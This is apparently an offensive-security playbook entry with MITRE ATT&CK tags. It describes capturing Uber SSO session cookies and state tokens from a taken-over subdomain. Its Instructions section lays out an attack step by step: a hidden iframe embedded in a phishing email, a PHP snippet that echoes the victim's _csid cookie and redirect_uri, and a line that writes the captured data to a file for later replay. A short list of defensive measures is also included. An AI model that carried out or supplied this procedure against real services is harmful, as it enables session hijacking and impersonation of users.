---
id: 123e4567-e89b-12d3-a456-426614174004
name: Capture-SSO-Cookies-via-Malicious-Redirect-on-Taken-Over-Subdomain
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.861Z'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[SAML Tokens]]'
sub_techniques: []
tags:
  - cookie-theft
  - sso
  - phishing
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[SAML Tokens]]'
---

# Capture-SSO-Cookies-via-Malicious-Redirect-on-Taken-Over-Subdomain

## Summary

This procedure exploits shared SSO cookies by hosting a malicious page on a taken-over subdomain that triggers authentication redirects, capturing temporary session cookies like _csid during the login flow for later replay.

## Description

When a victim authenticates at riders.uber.com, it redirects to auth.uber.com, setting a shared _csid cookie (domain=.uber.com). The malicious saostatic.uber.com/prepareuberattack.php is loaded (e.g., iframe), initiating a login to capture state token, state cookie, and _csid. The page relays the flow and outputs values for theft. Targets SSO systems with broad cookie scopes; requires subdomain control. Outcomes: Stolen credentials for impersonation.

## Requirements

1. Control of subdomain with malicious script
2. Victim interaction (e.g., via phishing link)
3. Knowledge of SSO redirect patterns

## Defense

Defensive measures and detection strategies:

- Scope cookies to specific subdomains (e.g., .auth.uber.com only)
- Implement SameSite=Strict/Lax to prevent cross-site cookie leakage
- Monitor for anomalous logins from trusted subdomains

## Objectives

1. Trigger SSO flow from malicious subdomain
2. Extract shared session cookies
3. Bypass CSRF via state relay

## Instructions

### Step 1: Lure Victim to Malicious Page

**Context**: Ensure victim visits the subdomain during or after login.

**Command** (N/A; Social Engineering):
```bash
# Embed iframe in phishing email: <iframe src="https://saostatic.uber.com/prepareuberattack.php" style="display:none;"></iframe>
```

> Victim's browser loads script, which starts auth flow if not logged in.

### Step 2: Capture During Redirect

**Context**: Script intercepts _csid set during auth.uber.com redirect.

**Command** (PHP Script Snippet):
```php
<?php
// In prepareuberattack.php
echo "URL: " . $_GET['redirect_uri'];
echo "Cookie: " . $_COOKIE['_csid'];
// Capture state=CSRFTOKEN from query
?>
```

> Expected: Outputs like _csid=abc123; state=xyz789 upon execution.

### Step 3: Store Captured Data

**Context**: Log for replay.

**Command** (Log to File):
```bash
# In script: file_put_contents('captured.txt', $cookie_data);
```

> Retrieve from server for next steps.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie
- [[SAML Tokens]] Forge Web Credentials: SAML Tokens (adapted for cookies)

### Sub-Techniques

- None

## Commands Used

- None specific

## Tools Used

- PHP Server

## Tags

- [[cookie-theft]]
- [[sso]]
